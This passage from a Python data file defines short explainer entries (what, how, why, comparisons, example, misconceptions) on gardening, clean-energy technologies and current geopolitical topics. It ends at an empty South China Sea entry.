    "ex": "growing tomatoes on an apartment balcony: 15-gallon fabric pot, high-quality potting mix mixed with compost, indeterminate cherry tomato variety, support cage, water daily in heat, fertilize weekly with diluted fish emulsion. Yields a few pounds of tomatoes from one plant over the season",
    "mis": "people use garden soil in containers; it compacts, drains poorly, and may carry pathogens. Use potting mix designed for containers. Another myth is that any container works; pots without drainage holes drown roots, and small containers force constant watering and stunt plants",
}
T["houseplant care"] = {
    "what": "the practice of growing plants indoors. Successful houseplant care requires matching species to indoor light levels, watering correctly (the leading cause of houseplant death is overwatering), and providing appropriate humidity and temperature",
    "how": "assess light by direction and obstruction: south-facing window is brightest; north-facing is dim. Water when the top inch of soil is dry for most species; many can tolerate drought better than constant moisture. Most houseplants prefer 60-80F and benefit from occasional humidity (grouping plants, pebble trays, or humidifiers)",
    "why": "houseplants improve air quality marginally (NASA studies are often overinterpreted), but they consistently improve mood, productivity, and home aesthetics. They also let urban dwellers experience nature year-round and develop horticultural skills",
    "vs": "low-light tolerant plants (snake plant, pothos, ZZ plant) survive most conditions including beginners. Light-hungry plants (succulents, fiddle leaf fig, citrus) need bright indirect or direct sun. Plants from tropical rainforests typically prefer humidity; succulents prefer dry. Match the plant to the spot",
    "ex": "a north-facing studio apartment: ZZ plant in the corner, pothos cascading from a shelf, snake plant on the desk -- all tolerate low light and weeks between waterings. Adding a peace lily near a humid bathroom completes a low-maintenance collection that survives travel and inattention",
    "mis": "people water on a fixed schedule rather than when the plant actually needs it; soil moisture, not the calendar, should drive watering. Another myth is that misting helps most plants -- it briefly raises humidity but evaporates fast; a humidifier or pebble tray is more effective for tropical plants",
}

# === CURRENT_EVENTS: sustainability ===
T["electric vehicle adoption"] = {
    "what": "the transition from internal combustion engine vehicles to battery electric vehicles (BEVs) and plug-in hybrids (PHEVs). Global EV market share rose from <1% in 2015 to ~20% of new sales by 2024, with China leading at over 40% and Norway above 90%",
    "how": "EVs use lithium-ion battery packs powering electric motors. Charging happens at home (overnight, Level 2) or at public DC fast chargers (10-30 minutes for ~80%). Battery range typically 200-400 miles per charge for modern models. Total cost of ownership is increasingly competitive with ICE due to lower fuel and maintenance costs",
    "why": "EVs cut transportation emissions, reduce urban air pollution, and offer better performance and lower running costs. Transportation is ~15-20% of global CO2 emissions, so the EV transition is critical for climate goals. Government incentives, dropping battery costs, and improving charging infrastructure are accelerating adoption",
    "vs": "compared with hybrids (gas engine + battery), pure BEVs eliminate tailpipe emissions and are simpler mechanically. Compared with hydrogen fuel cells, BEVs leverage existing electrical infrastructure and are far more energy-efficient end-to-end. Charging speed is improving but still slower than refueling gasoline",
    "ex": "a 2024 mid-range BEV (Tesla Model 3, Hyundai Ioniq 6) costs $35K-50K, drives 300+ miles per charge, costs ~$5/100 miles to drive (vs ~$15 for gas), needs minimal maintenance (no oil changes, fewer brake replacements), and produces zero tailpipe emissions",
    "mis": "people think EVs are dirty due to battery production; lifecycle analyses show EVs produce 50-70% less CO2 than ICE over their lifetime, even on coal-heavy grids. Another myth is that EVs always have range anxiety; for most drivers, home charging plus 250+ mile range covers daily use without thinking about it",
}
T["lithium-ion battery supply chains"] = {
    "what": "the global production network for lithium-ion batteries, spanning mining of raw materials (lithium, cobalt, nickel, manganese, graphite), refining, cell manufacturing, pack assembly, and recycling. The supply chain is concentrated and increasingly geopolitically contested",
    "how": "raw materials: lithium from Australia, Chile, China; cobalt from Democratic Republic of Congo (~70%); nickel from Indonesia, Philippines. Refining: China dominates ~70% of lithium and cobalt processing. Cell manufacturing: China ~80%, with Korea (LG, Samsung), Japan (Panasonic), and US (Tesla, expanding) trailing",
    "why": "battery supply is the bottleneck for EV and grid storage scaling. Concentration creates geopolitical risk (US-China tensions, Congo instability), environmental concerns (cobalt mining conditions), and price volatility (lithium prices swung 10x in 2021-2023). Regional supply chains are forming via the Inflation Reduction Act and EU Battery Regulation",
    "vs": "compared with oil supply chains (decades of trading infrastructure), battery supply is younger, more concentrated, and tied to specific deposits. Compared with semiconductor supply (Taiwan-dominated), battery supply has more potential for diversification because deposits exist on multiple continents",
    "ex": "a Tesla Model Y battery: lithium from Australia, refined in China; cobalt from Congo, refined in China; nickel from Indonesia; cells assembled in Tesla's Nevada gigafactory; pack assembled at Fremont. Each link adds geopolitical, financial, and environmental considerations",
    "mis": "people think we'll run out of lithium; reserves are abundant, but extraction and refining capacity is the bottleneck. Another myth is that batteries are not recyclable; modern recycling recovers 95%+ of metals economically when feedstock is available, and recycling will become a major lithium source by 2035",
}
T["solid-state batteries"] = {
    "what": "next-generation batteries that replace the liquid electrolyte of lithium-ion with a solid electrolyte (polymer, sulfide, or oxide). Solid-state designs promise higher energy density, faster charging, longer life, and improved safety -- but commercialization has been slower than predicted",
    "how": "solid electrolytes conduct ions between anode and cathode without flammable liquids. Lithium metal anodes (vs lithium-graphite in current cells) increase capacity dramatically. Manufacturing challenges include scaling solid-state cell assembly, achieving long cycle life, and handling temperature changes",
    "why": "solid-state could enable EVs with 500+ mile range, 10-minute charging, and reduced fire risk -- a step-change improvement over lithium-ion. Toyota, Samsung, QuantumScape, and Solid Power are racing to commercialize. Initial niche applications (medical devices, premium EVs) are emerging in 2025-2027",
    "vs": "compared with conventional lithium-ion, solid-state offers ~2x energy density, faster charging, and no flammable liquid. The cost is manufacturing complexity, current high prices, and unproven cycle life at scale. Sodium-ion is a parallel alternative for lower-cost storage that doesn't need lithium",
    "ex": "Toyota announced solid-state EV battery production for 2027-2028, with 750-mile range and 10-minute fast charging. Mercedes is partnering with Factorial Energy for premium model deployment. Samsung is producing limited solid-state batteries for premium devices and aviation",
    "mis": "people think solid-state will arrive next year; the first mainstream production has slipped repeatedly. Another myth is that solid-state will instantly replace lithium-ion; both technologies will likely coexist, with solid-state in premium and high-performance applications and lithium-ion in cost-sensitive ones",
}

# === Continue with remaining current_events topics ===
T["hydrogen as an energy carrier"] = {
    "what": "hydrogen used as a clean fuel or energy storage medium. Hydrogen burns or fuel-cells back to electricity producing only water. It can be produced cleanly via electrolysis (green hydrogen) using renewable electricity, or unsustainably from natural gas (gray) or with carbon capture (blue)",
    "how": "production: electrolysis splits water into hydrogen and oxygen using ~50 kWh per kg of H2. The hydrogen is compressed or liquefied for transport, then used in fuel cells (direct electricity), industrial processes (steel, fertilizer), or combustion (turbines, marine). Round-trip efficiency electricity-to-electricity is ~30-40%, much lower than batteries",
    "why": "hydrogen offers solutions where batteries don't fit: long-distance shipping, aviation, steel making (replacing coke), industrial heat, and seasonal grid storage. Major investments from Germany, Japan, EU, and the US Inflation Reduction Act are scaling green hydrogen capacity",
    "vs": "compared with batteries, hydrogen has lower round-trip efficiency but higher energy density by mass and longer storage duration. Compared with biofuels, hydrogen scales without arable land. Compared with fossil fuels, green hydrogen is currently more expensive but costs are dropping rapidly with electrolyzer scale",
    "ex": "a steel plant in Sweden (HYBRIT) produces hydrogen from electrolysis powered by hydropower, then uses it instead of coke to reduce iron ore. The result: nearly carbon-free steel. Conventional steelmaking is ~7% of global CO2 emissions, so hydrogen-based steel is a major decarbonization path",
    "mis": "people see hydrogen as a 'silver bullet' for cars; battery EVs are far more efficient for passenger transport. Hydrogen's niche is heavy industry and transport where batteries are too heavy. Another myth is that hydrogen is dangerous -- it's flammable but disperses quickly in open air, often safer than gasoline in similar accident scenarios",
}
T["offshore wind energy"] = {
    "what": "wind farms built in coastal waters, where steadier and stronger winds yield much higher capacity factors (40-60%) than onshore wind (25-40%). Modern turbines exceed 15 MW per unit, with rotor diameters over 230 meters",
    "how": "turbines are mounted on monopiles (shallow water), jackets (deeper), or floating platforms (deep water beyond 60m). Subsea cables collect generation to an offshore substation that exports to shore via high-voltage AC or DC cables. Specialized installation vessels build the foundations and lift turbines",
    "why": "offshore wind unlocks vast, high-quality wind resources near coastal load centers without competing for land. Europe leads with ~30 GW deployed by 2024; the UK alone exceeds 14 GW. The US is catching up with major projects off Massachusetts, New York, Virginia, and the Gulf of Mexico in 2024-2027",
    "vs": "compared with onshore wind, offshore is more expensive per kW but produces ~50% more energy and faces less local opposition. Compared with solar, wind generates day and night and complements solar's daytime peak. Compared with fossil generation, offshore wind has zero fuel cost and tiny ongoing emissions",
    "ex": "Dogger Bank in the UK North Sea is the world's largest offshore wind farm, with ~3.6 GW once complete (~2026). Turbines are 13-14 MW, blades 107m long. The full project will power 6 million homes and offset ~2.5 million tons of CO2 annually",
    "mis": "people think offshore wind harms whales; rigorous studies have not found a connection between recent offshore wind activity and whale strandings on the US East Coast. Another myth is that wind turbines kill many birds; cats and buildings each kill orders of magnitude more birds annually",
}
T["solar farm efficiency"] = {
    "what": "the percentage of incident solar energy a utility-scale photovoltaic plant converts to electricity. Module efficiency is typically 20-23% for crystalline silicon; system efficiency (after inverters, transmission, soiling, temperature) is around 15-18%. Capacity factor (annual output / nameplate capacity) is ~20-30% in sunny regions",
    "how": "panels track the sun (single- or dual-axis trackers boost output 15-30% over fixed-tilt). Inverters convert DC to grid AC. Plant losses include module mismatch, wiring, inverter inefficiency, transformer losses, soiling, shading, and temperature derating. Modern plants approach 80-85% performance ratio (energy delivered / theoretical maximum)",
    "why": "every percentage point of efficiency improvement at gigawatt scale represents massive cost savings and emissions reductions. Solar costs dropped 90%+ since 2010, making it the cheapest new electricity source in many markets. Continued efficiency improvements support continued cost declines and integration with the grid",
    "vs": "monocrystalline silicon (~22%) outperforms polycrystalline (~17%) at higher cost. Thin-film (CdTe, CIGS) is cheaper but typically lower efficiency. Tandem and perovskite cells in development promise 30%+ commercial efficiency by late 2020s. Concentrated solar (CSP) has higher theoretical limits but is more expensive",
    "ex": "Bhadla Solar Park in India: 2.25 GW capacity across 14,000 acres, capacity factor ~22% (high direct sun, dust derate). Annual generation ~4.4 TWh, displacing ~3.6 million tons of CO2 from coal. New US installations are tracking 25%+ capacity factors with bifacial trackers",
    "mis": "people think solar panel efficiency is the most important factor; balance-of-system costs (mounting, wiring, inverters, labor, land) often dominate. Another myth is that solar farms heat the planet -- their heat island effects are tiny, and they replace much higher-emission generation",
}
T["small modular reactors"] = {
    "what": "nuclear reactors with capacities under ~300 MW per unit, designed for factory production and modular assembly on site. SMRs aim to reduce nuclear's traditional cost, schedule, and safety challenges via standardized design, passive safety, and economies of series production",
    "how": "designs vary: light-water (NuScale, GE-Hitachi BWRX-300), molten salt (Terrestrial), gas-cooled (X-energy), sodium-cooled (TerraPower Natrium). Common features include factory fabrication of major components, transportation by rail or barge, and passive safety systems that cool the reactor without active power for days",
    "why": "nuclear provides firm low-carbon power that complements variable renewables. Conventional reactors face $10B+ projects with multi-year delays. SMRs aim to deliver $2-5B units in 3-5 years, opening nuclear to industrial customers, smaller utilities, and remote communities. Several US, Canadian, and UK projects target operation by late 2020s",
    "vs": "compared with traditional reactors, SMRs trade some thermal efficiency and economies of scale for faster build, smaller risk per project, and broader customer base. Compared with renewables, SMRs are dispatchable and operate 24/7. Compared with natural gas peakers, SMRs are zero-carbon",
    "ex": "GE-Hitachi's BWRX-300 has been selected by Ontario Power Generation for deployment at Darlington (operating 2029) and by TVA for Clinch River (2032 target). The Polish utility Orlen Synthos and several others have signed orders. NuScale's first US project was canceled in 2023 due to cost overruns -- showing the path is not without setbacks",
    "mis": "people think SMRs are unproven new technology; many designs leverage decades of operating reactor experience. Another myth is that SMRs are imminent at scale; commercial deployment is starting late 2020s with broader scaling in the 2030s. The nuclear timeline remains long",
}
T["geothermal energy"] = {
    "what": "energy harnessed from the Earth's internal heat. Conventional geothermal taps hot water and steam from natural reservoirs, mostly in volcanic regions. Enhanced geothermal systems (EGS) inject water into hot dry rock, opening geothermal to most regions if costs come down",
    "how": "conventional plants drill into hot reservoirs (often >150C) and use the steam directly (flash plants) or transfer heat to a working fluid (binary plants). EGS fractures hot rock 3-10 km down, circulates water through the fractures, and brings the heated water to surface for power generation. Heat pumps tap shallow earth temperatures (~50-60F year-round) for building heating/cooling",
    "why": "geothermal provides firm baseload renewable energy with tiny land footprint. Iceland generates ~30% of electricity from geothermal; Kenya ~50%. EGS could expand geothermal to most US states (theoretical resource exceeds total US demand by orders of magnitude). The technology is finally maturing with help from oil-and-gas drilling expertise",
    "vs": "compared with solar and wind, geothermal runs 24/7 with capacity factors 80%+. Compared with nuclear, geothermal has no waste, no proliferation, and faster permitting. Compared with conventional natural gas, geothermal has zero emissions in operation",
    "ex": "Fervo Energy's Cape Station in Nevada (2023+) demonstrates EGS at commercial scale, using horizontal drilling and multi-stage fracturing borrowed from oil and gas. The project will deliver 400 MW by 2028, enough for 300,000 homes, and validates an approach that could scale globally",
    "mis": "people think geothermal only works in volcanic areas; EGS expands the resource to most regions with sufficient depth. Another myth is that geothermal causes earthquakes -- some EGS projects have triggered minor seismicity, but modern site selection and pressure management reduce the risk substantially",
}
T["carbon capture and storage"] = {
    "what": "capturing CO2 from large emission sources (power plants, cement, steel) before it reaches the atmosphere, then transporting and storing it underground in geological formations. CCS is one tool for reducing emissions from hard-to-abate sectors and for negative emissions when combined with bioenergy (BECCS)",
    "how": "post-combustion capture uses chemical solvents (amines) to absorb CO2 from flue gas. Other approaches include pre-combustion (gasify fuel, separate CO2, burn the rest) and oxy-fuel (burn in pure oxygen for concentrated CO2 stream). Captured CO2 is compressed and pumped into deep saline aquifers or depleted oil/gas reservoirs",
    "why": "industries like cement, steel, and chemicals have process emissions that can't be eliminated by switching to renewables. CCS offers a path to decarbonize them. Globally ~50 commercial CCS facilities operate in 2024 with ~50 MtCO2/year capture capacity, far below the gigatonnes needed but growing rapidly",
    "vs": "compared with switching to renewables (preferred where possible), CCS lets existing high-emission infrastructure operate with much lower net emissions. Compared with direct air capture (DAC), CCS at sources is cheaper because CO2 concentrations are 100-1000x higher than in ambient air",
    "ex": "the Sleipner gas field in Norway has injected ~1 MtCO2/year into a saline aquifer beneath the North Sea since 1996, demonstrating multi-decade safe storage. The Quest project in Canada captures CO2 from a hydrogen plant. Many proposed projects await final investment decisions in 2024-2027",
    "mis": "people think CCS is a way for fossil fuels to continue indefinitely; current scale is tiny, and renewables remain the cheapest emission cuts. CCS is a complement to (not a substitute for) the broader transition. Another myth is that storage is risky -- decades of experience show negligible leakage from properly sited reservoirs",
}
T["direct air capture"] = {
    "what": "removing CO2 directly from ambient air using chemical processes, then storing it underground or using it as a feedstock. DAC enables negative emissions -- removing historical CO2 -- but is currently expensive due to the dilute concentration of CO2 (~420 ppm)",
    "how": "two main approaches: solid sorbent (amines coating filters; cycle through capture and CO2 release with heat) and liquid solvent (potassium hydroxide solution; CO2 is precipitated, then released by heating limestone). Energy intensive: ~2000-4000 kWh per tonne of CO2, ideally from low-carbon sources",
    "why": "achieving the Paris climate targets requires removing some historical CO2, not just stopping emissions. DAC is one of few technologies that can do this at scale, alongside BECCS and natural solutions. Major facilities: Climeworks (Iceland, 36,000 tCO2/yr operating), 1PointFive (Texas, 500,000 tCO2/yr by 2025)",
    "vs": "compared with point-source CCS (capturing from concentrated streams), DAC works from ambient air -- 100-1000x harder due to lower concentration. Compared with afforestation, DAC is more reliable per tonne but vastly more expensive. Currently $300-1000/tonne; DOE targets $100/tonne by 2030",
    "ex": "Climeworks' Mammoth plant in Iceland (operating 2024) captures ~36,000 tonnes of CO2 per year, mineralized in basalt rock via the Carbfix process. Microsoft, Stripe, and Google Frontier have purchased multi-million-dollar DAC removal credits to start scaling the industry",
    "mis": "people see DAC as a way to keep emitting; the technology is far too small and expensive to do that. DAC's role is closing the residual gap after deep emission cuts. Another myth is that DAC is a 'fake' solution -- the chemistry is real, the cost is the challenge, and costs are projected to drop substantially with scale",
}
T["regenerative agriculture"] = {
    "what": "farming practices that aim to restore soil health, biodiversity, water cycles, and ecosystem function while producing food. Practices include cover cropping, no-till, diverse rotations, integrating livestock, reducing synthetic inputs, and managing for soil organic matter",
    "how": "no-till and reduced tillage preserve soil structure and microbial communities. Cover crops between cash crops add organic matter, fix nitrogen, prevent erosion. Diverse rotations break pest cycles. Managed grazing mimics natural herd movements, building soil. Together, these practices can shift agriculture from a net carbon source to a sink",
    "why": "industrial agriculture has degraded ~33% of soils globally, contributing to flooding, drought, biodiversity loss, and significant emissions. Regenerative practices can rebuild soils, sequester carbon, improve farm resilience, and often improve profitability over time. Major brands (General Mills, Walmart) and governments are funding the transition",
    "vs": "compared with conventional agriculture, regenerative reduces synthetic inputs and tillage but typically requires longer transition periods (3-5 years) and management knowledge. Compared with organic certification (which prohibits synthetic inputs), regenerative focuses on outcomes (soil health) and is more flexible on practices",
    "ex": "a Midwest corn-soybean farmer transitions to no-till, cover crops (cereal rye), and a 4-year rotation including small grains and pasture. Year 5 yields rebound to or exceed previous levels with lower input costs (less fertilizer, fewer herbicides), higher water-holding soils, and a marketable carbon credit",
    "mis": "people think regenerative agriculture can't feed the world; well-managed regenerative systems can match or exceed conventional yields after the transition. Another myth is that regenerative is just organic with new branding -- the focus on soil health and outcome metrics is distinct, and regenerative may use synthetic inputs strategically",
}
T["vertical farming"] = {
    "what": "agriculture that stacks crops in vertically arranged layers, typically indoors using LED lighting, controlled environment, and hydroponic or aeroponic root systems. Vertical farms aim to grow food year-round near urban centers with minimal land and water use",
    "how": "LEDs tuned to photosynthetic wavelengths, climate-controlled rooms, recirculating water systems, and automated planting/harvesting enable production 50-100x denser than traditional fields per acre. Crops are typically leafy greens, herbs, microgreens, and increasingly strawberries -- crops where high price per pound supports the higher production cost",
    "why": "vertical farming addresses urban food security, reduces food miles, eliminates pesticides, uses 90%+ less water than conventional, and enables farming in climates and locations otherwise inhospitable. The economics are challenging -- many high-profile vertical farms (AeroFarms, Bowery, Plenty) have faced bankruptcies or downsizing in 2023-2024 due to high energy costs",
    "vs": "compared with field agriculture, vertical farming has dramatically higher yields per acre but much higher capital and energy costs. Compared with greenhouses (which use sun for free), vertical farms pay for all the light. Vertical farming makes sense for premium specialty crops near urban markets, less for staple crops",
    "ex": "a typical vertical farm: 10-story stack of growing trays in an urban warehouse, 1 acre footprint producing equivalent of 20-30 acres of conventional lettuce, water use 5% of conventional, year-round production, sold to local restaurants and grocery within a day of harvest",
    "mis": "people think vertical farming will replace field agriculture; energy economics make it suitable mainly for high-value crops near cities. Another myth is that vertical farming is automatically sustainable -- if the electricity is fossil-fueled, the carbon footprint per kg of lettuce can exceed field-grown",
}
T["lab-grown meat"] = {
    "what": "meat produced by cultivating animal cells in bioreactors, without raising or slaughtering animals. Also called cultivated meat, cell-based meat, or cultured meat. Products include chicken, beef, pork, seafood, and even foie gras, with regulatory approvals expanding in 2023-2025",
    "how": "stem cells are taken from an animal (often via biopsy without harm), cultured in nutrient media containing growth factors, and grown on scaffolds that give shape and texture. The cells multiply, differentiate into muscle and fat, and are harvested as meat. Current products are mostly ground/processed; whole-cut steaks remain technically challenging",
    "why": "cultivated meat could dramatically reduce animal agriculture's land, water, and emissions footprint while ending most animal slaughter. The challenges are cost (still 10-100x conventional meat), scale, regulatory acceptance, and consumer acceptance. Singapore approved cultivated chicken in 2020; the US FDA approved Upside Foods and GOOD Meat in 2023",
    "vs": "compared with plant-based alternatives (Beyond, Impossible), cultivated meat is biologically meat -- same proteins, same molecular structure -- which appeals to consumers who reject plant-based for taste or ideology. Compared with conventional meat, cultivated meat avoids slaughter and has potential for lower environmental impact at scale",
    "ex": "Upside Foods and GOOD Meat's cultivated chicken debuted at high-end restaurants in San Francisco and Washington DC in 2023 -- $30+ small portions. By 2026-2027, scale-up should bring prices down meaningfully. Italy banned cultivated meat in 2023 to protect traditional agriculture; regulatory variability will shape adoption",
    "mis": "people think cultivated meat will replace conventional meat soon; economics suggest it will be a niche product through the 2020s and likely the 2030s. Another myth is that cultivated meat is automatically more sustainable -- it depends on the energy mix and process efficiency, both of which need improvement",
}

# === CURRENT_EVENTS: geopolitics ===
T["the BRICS expansion"] = {
    "what": "the BRICS bloc -- originally Brazil, Russia, India, China, South Africa -- expanded in 2024 to add Egypt, Ethiopia, Iran, Saudi Arabia, and the UAE. The expanded group represents ~45% of the world's population and 35%+ of global GDP at purchasing-power parity",
    "how": "BRICS operates as an informal coordination bloc with annual summits, the New Development Bank (a multilateral lender), and the Contingent Reserve Arrangement (a currency-swap pool). Expansion was decided at the 2023 Johannesburg summit and took effect in 2024. Argentina was invited but declined under President Milei",
    "why": "BRICS represents a partial counterweight to Western-led institutions (G7, IMF, World Bank). The expansion adds major energy producers (Saudi Arabia, UAE, Iran) and African weight, expanding economic and political reach. It signals a reshaping of the global order toward more multipolar arrangements",
    "vs": "compared with G7 (advanced industrial democracies), BRICS includes diverse political systems and developing economies. Compared with NAM (Non-Aligned Movement), BRICS has more economic heft and active institutions. Compared with the SCO (Shanghai Cooperation Organization), BRICS spans more continents but is less security-focused",
    "ex": "the BRICS New Development Bank has lent over $30 billion since 2015 for infrastructure projects, an alternative to World Bank lending without conditionality on governance reforms. Russia uses BRICS to maintain trade with India and China despite Western sanctions",
    "mis": "people think BRICS will replace the dollar imminently; intra-BRICS trade in local currencies is growing but remains a small share of global trade. Another myth is that BRICS is monolithic; India and China have major rivalries, and the bloc is loose coordination, not a unified policy machine",
}
T["NATO's evolving role"] = {
    "what": "the North Atlantic Treaty Organization, founded in 1949 to deter Soviet expansion, has evolved through Cold War, post-Cold-War, and post-2014 phases. Russia's 2022 invasion of Ukraine refocused NATO on territorial defense, prompting Finland's and Sweden's accessions and major defense-spending increases",
    "how": "NATO's core commitment, Article 5, treats an attack on one member as an attack on all. The Alliance combines integrated military planning, joint exercises, the NATO Response Force, and increasingly forward-deployed multinational battlegroups in Eastern Europe. Decisions require consensus among all members",
    "why": "NATO's renewed focus has reshaped European security: Germany announced a 100 billion euro defense modernization, members commit to spending 2%+ of GDP on defense (most now meeting the target), and the Alliance has added 200,000 forces to high-readiness status. Ukraine remains outside NATO but receives extensive coordination support",
    "vs": "compared with the EU's defense efforts (PESCO, the European Peace Facility), NATO has hard-power credibility and US engagement. Compared with bilateral security pacts, NATO's collective defense scales deterrence. NATO's expansion since 1991 has been controversial -- supporters call it stabilization; critics call it provocation",
    "ex": "Finland joined NATO in 2023 and Sweden in 2024, doubling NATO's land border with Russia. The Alliance now positions multinational battalions in all Baltic states and Poland, with forward-deployed equipment for rapid US reinforcement. Defense industries are scaling up production of artillery shells and air defense systems",
    "mis": "people think NATO is purely defensive; out-of-area operations (Afghanistan, Libya, Kosovo) showed it can act offensively under various legal frameworks. Another myth is that NATO is obsolete -- the post-2022 era has reaffirmed its core purpose, even as US political dynamics raise questions about long-term commitment",
}
T["Taiwan strait tensions"] = {
    "what": "the disputed political status of Taiwan and the military activity around the strait separating it from mainland China. The PRC claims Taiwan as a province; Taiwan operates as a de facto independent state. The US maintains strategic ambiguity, providing defense support without formal recognition",
    "how": "China conducts increasingly large military exercises around Taiwan, including encirclement drills following high-profile US visits. Taiwan invests in asymmetric defense (mines, missiles, drones) to deter invasion. The US sells advanced weapons to Taiwan and maintains regional naval presence. Diplomatic and economic interactions continue across many channels",
    "why": "Taiwan produces ~90% of advanced semiconductors (TSMC), making the strait one of the most economically critical regions globally. A conflict would devastate global supply chains, push the US and China toward direct confrontation, and reshape the Indo-Pacific. Risk of escalation is among the highest in current geopolitics",
    "vs": "compared with the Russia-Ukraine war, a Taiwan crisis would have larger global economic spillover via semiconductors and shipping lanes. Compared with the South China Sea disputes, Taiwan involves direct great-power confrontation rather than diffuse maritime claims",
    "ex": "TSMC's decision to build advanced fabs in Arizona and Japan reflects both customer (Apple, AMD) and government (US, Japan) pressure to diversify the semiconductor supply chain in case of disruption. Taiwan's defense budget has grown ~50% over five years, with US-supplied F-16Vs, HIMARS, and Harpoon missiles",
    "mis": "people think the US has a treaty defense obligation to Taiwan; the Taiwan Relations Act commits the US to provide defensive arms but doesn't explicitly require military intervention. Another myth is that semiconductor decoupling can occur quickly -- TSMC's most advanced production is years from being replicated outside Taiwan",
}
T["the Russia-Ukraine conflict"] = {
    "what": "an active war that began with Russia's full-scale invasion of Ukraine on February 24, 2022, building on the 2014 annexation of Crimea and the Donbas conflict. By 2026 the war has reshaped European security, energy, and economics, with hundreds of thousands of casualties on both sides",
    "how": "after a failed initial drive on Kyiv, the war shifted to attritional fighting in the east and south, with Ukrainian counteroffensives in 2022 (Kharkiv, Kherson) followed by stalemate in 2023-2024. Russia mobilized partially, expanded defense production; Ukraine relies heavily on Western arms (HIMARS, ATACMS, F-16s, Patriot, tanks) and innovative drone warfare",
    "why": "the war is the largest in Europe since WWII and has driven NATO's revival, Finland and Sweden joining, severe Western sanctions on Russia, global food and energy disruption (2022-2023 spikes), and a redrawing of European energy supply away from Russian gas. The outcome will shape European security for decades",
    "vs": "compared with the 2014-2022 phase (limited, ambiguous), the post-2022 war is conventional, large-scale, and existential. Compared with US wars in Iraq/Afghanistan, this is great-power-supported state-on-state war with massive industrial mobilization on both sides. Compared with the Korean War, both sides have nuclear arsenals -- nuclear escalation risk persists",
    "ex": "Ukraine's drone warfare innovations include long-range strike drones hitting Russian refineries deep inside Russia, naval drones sinking Black Sea Fleet vessels, and FPV drones reshaping infantry tactics. Russia adapted with massive production of Shahed-style drones and glide bombs. Both sides demonstrate rapid wartime adaptation",
    "mis": "people see the war as either inevitable or impossible to end; both views oversimplify. Another myth is that one side will achieve total victory soon -- the trajectory through 2024-2026 has been protracted attrition with neither side achieving decisive breakthrough. Negotiation conditions remain politically and territorially difficult for both sides",
}
T["Middle East energy politics"] = {
    "what": "the geopolitical dynamics of oil and gas production, export, and pricing centered on the Middle East, which holds ~50% of proven oil reserves and ~40% of natural gas reserves. OPEC+ coordination, the Strait of Hormuz chokepoint, and US/China/EU energy strategies define the politics",
    "how": "OPEC+ (OPEC plus Russia and others) coordinates production to manage prices. Saudi Arabia retains spare capacity and effectively sets the marginal price. Export terminals in the Persian Gulf supply Asia (over 60%), Europe, and the Americas. Disruptions in the Strait of Hormuz, Bab al-Mandeb, or Red Sea cascade through global markets",
    "why": "energy prices set by Middle East producers shape global inflation, geopolitics, and energy transition pace. The 2022 Russia sanctions intensified demand for Middle East oil and gas; the Saudi-Iran restoration (2023, China-mediated) and Israel-Hamas-Hezbollah conflict (since October 2023) reshaped regional alignments and risks",
    "vs": "compared with the 1970s oil crises, Middle East producers face more competition (US shale, Brazilian deepwater, African producers) and energy transition pressure. Compared with mid-2010s, the political fluidity of US strategic priorities (Iran, Saudi normalization with Israel) and rising Chinese diplomatic role have shifted the landscape",
    "ex": "Houthi attacks on shipping in the Red Sea (since late 2023) caused most container traffic to reroute around Africa, lengthening voyages by 10-14 days, raising shipping costs, and contributing to inflation in 2024. The narrow Bab al-Mandeb strait remains a chokepoint with insufficient alternatives",
    "mis": "people think the energy transition makes Middle East oil irrelevant soon; oil demand likely peaks in the late 2020s but declines slowly through the 2040s, with Middle Eastern producers retaining significant influence. Another myth is that US shale ended Saudi pricing power; OPEC+ coordination still moves prices meaningfully",
}
T["the African Continental Free Trade Area"] = {
    "what": "a free-trade agreement among 54 African countries (all African Union members except Eritrea) that entered force in 2021. AfCFTA aims to create a single market of 1.4 billion people and $3.4 trillion in GDP, eliminating tariffs on 90%+ of goods over time",
    "how": "tariffs phase down gradually, with sensitive products getting longer phase-out. Rules of origin determine which goods qualify. The Pan-African Payment and Settlement System (PAPSS) launched in 2022 to enable cross-border payments without going through the dollar or euro, reducing transaction costs",
    "why": "intra-African trade has been only ~15% of total trade -- low compared with intra-EU (~70%) or intra-Asian. AfCFTA aims to boost intra-African trade by 50%+ over a decade, reduce dependence on commodity exports, build manufacturing supply chains, and increase economic integration. The World Bank estimates 30 million people could exit extreme poverty by 2035 if implemented well",
    "vs": "compared with the EU (deep integration including labor mobility, common currency in eurozone), AfCFTA is initially focused on goods trade. Compared with NAFTA/USMCA, AfCFTA spans far more countries with greater diversity. Implementation will take years; trade volumes are scaling slowly",
    "ex": "the first commercial shipment under AfCFTA preferential rules was Ghanaian-made cosmetics to Guinea in 2022. By 2024, hundreds of products are trading under AfCFTA rules. Pilot programs in 8 countries are demonstrating digital trade documentation and simplified procedures",
    "mis": "people think AfCFTA will transform African economies overnight; trade integration is a slow process and physical infrastructure (roads, rail, ports) remains a major constraint. Another myth is that political differences will doom AfCFTA -- the EU itself has bridged major political divides, and African leaders have shown sustained commitment to the project",
}
T["Arctic sovereignty disputes"] = {
    "what": "competing claims to maritime territory, resources, and shipping routes in the Arctic, where melting sea ice is opening new economic and military possibilities. The eight Arctic states (US, Canada, Russia, Denmark/Greenland, Norway, Sweden, Finland, Iceland) all have stakes; China and other non-Arctic states seek influence",
    "how": "claims under UNCLOS extend continental shelf rights up to 350 nautical miles from coast where conditions are met. Russia, Canada, Denmark have submitted overlapping claims to the Lomonosov Ridge area. Disputes also involve passage rights through the Northwest Passage (Canada vs international) and the Northern Sea Route (Russia)",
    "why": "the Arctic holds an estimated 13% of undiscovered oil and 30% of undiscovered gas. Melting ice opens new shipping routes that could cut Asia-Europe transit by 40%. Strategic positioning for early-warning radars, submarine operations, and resource access has revived great-power attention to the region after a brief post-Cold-War quiet",
    "vs": "compared with the Antarctic (governed by the Antarctic Treaty preserving it for peaceful science), the Arctic is largely sovereign territory with active commercial and military interests. Compared with other contested regions, the Arctic Council has historically produced cooperation; Russia's 2022 actions strained that arrangement",
    "ex": "Russia maintains the largest Arctic military presence with over 50 reopened Soviet-era bases. Norway and Finland are bolstering Arctic NATO presence after their NATO accessions. China declared itself a 'near-Arctic state' in 2018 and conducts research and shipping investments through its 'Polar Silk Road' initiative",
    "mis": "people think Arctic shipping is already viable year-round; the Northern Sea Route still requires icebreaker escort for much of the year, even with reduced ice. Another myth is that Arctic conflict is imminent -- diplomatic mechanisms persist, though tensions have risen since 2022",
}
T["the South China Sea"] = {
